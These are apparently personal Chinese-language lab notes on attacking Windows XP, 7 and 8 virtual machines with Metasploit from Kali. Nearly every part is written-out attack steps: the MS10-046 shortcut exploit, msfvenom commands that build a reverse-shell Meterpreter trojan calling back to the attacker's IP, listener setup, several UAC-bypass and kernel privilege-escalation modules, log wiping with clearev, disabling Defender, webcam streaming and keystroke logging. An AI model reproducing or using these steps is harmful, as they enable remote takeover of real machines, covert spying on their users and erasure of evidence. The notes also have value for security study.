https://www.freebuf.com/vuls/351450.html
https://www.freebuf.com/vuls/347772.html

Windows XP Professional with Service Pack 3 (x86) - CD  2008-05-01  这个版本测试通过
win7   还没测试

use exploit/windows/browser/ms10_046_shortcut_icon_dllloader
set SRVHOST 192.168.55.201   kali  的 ip 地址
run
运行后生成 http://192.168.55.201/

在 xp 下打开这个链接  会跳转到 \\192.168.55.201\NCqMi\     有个快捷方式 跟dll
一会  kali 下面  就会提示成功 

meterpreter > upload /home/kali/openme.exe c:\
这条命令可以上传木马 
木马的生成过程    msfvenom -p windows/meterpreter/reverse_tcp Lhost=192.168.55.201 lport=50000 -f exe -o openme.exe
chmod 777 openme.exe 可能是多余的 

退出当前  meterpreter

可以用木马连接了


打开监听
use exploit/multi/handler 
set payload windows/meterpreter/reverse_tcp     xp是   x86 32位的
set lhost 192.168.55.201                 kali  ip 地址
set lport 50000                          
run

之后 xp 运行 openme.exe  就可以自动连上 
meterpreter > clearev    清除日志


有机会试试win7 64位  貌似要提权

cn_windows_7_professional_with_sp1_vl_build_x64_dvd_u_677816.iso 2011-05-12  win7打开连接失败
明天换2010年前的windows7 32 位 跟64位 试试

cn_windows_7_professional_x64_dvd_x15-65791.iso   2009-08-26
打开链接无法激活shell  无法继续实验

cn_windows_7_professional_x86_dvd_x15-65790.iso   2009-08-23




遥控 win8    msfvenom  -p windows/x64/meterpreter/reverse_tcp  LHOST=192.168.55.201  LPORT=50000  -f exe  -o openme.exe
use exploit/multi/handler 
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.55.201                 kali  ip 地址
set lport 50000                          
run
win8 能运行生产的木马 关了 windows defender 就行  clearev 没权限
管理员 权限 运行 openme.exe 可以 clearev 了
webcam_stream  普通权限就可以看摄像头了
晚上可以玩玩提权
cn_windows_7_professional_x64_dvd_x15-65791.iso   2009-08-26
通过  运行木马后 在利用 bypassuac 漏洞可以进行提权 
getsystem
background
search bypassuac
use exploit/windows/local/bypassuac                             
set SESSION 1
run
成功得到  session2 
getsystem 就不报错了  也能清日志  
在 win8.1 系统中 提权 失败了 并且弹提示框 

还是这个2009-08-26 系统 用另一种方法提权 

getsystem
background
use post/multi/recon/local_exploit_suggester
set SESSION 1
show options
run                                   
use exploit/windows/local/ms16_014_wmi_recv_notif           
set SESSION 1
show options
run
getsystem 这场显示是 Already running as SYSTEM


win8.1 提权都失败 
surface的win8.1 run vnc屏幕显示不全   win7 也显示不全

试试32位木马在64位电脑上运行看看 服务器客户端  都用 32位 在 64位 电脑上都能运行  run vnc还说显示不全  试试win7开防火墙也能用木木连接  win8开防火墙运行木马后  也能连接  

win7  win8  提权都失效 明天找原因
  win7 测试 提权 成功了 
win8  用 windows/local/bypassuac_sluihijack 提权成功 
exploit/windows/local/ms16_032_secondary_logon_handle_privesc
这两个 都 成功 带防火墙也能提权成功

键盘记录   keyscan_start      keyscan_dump  keysacn_stop
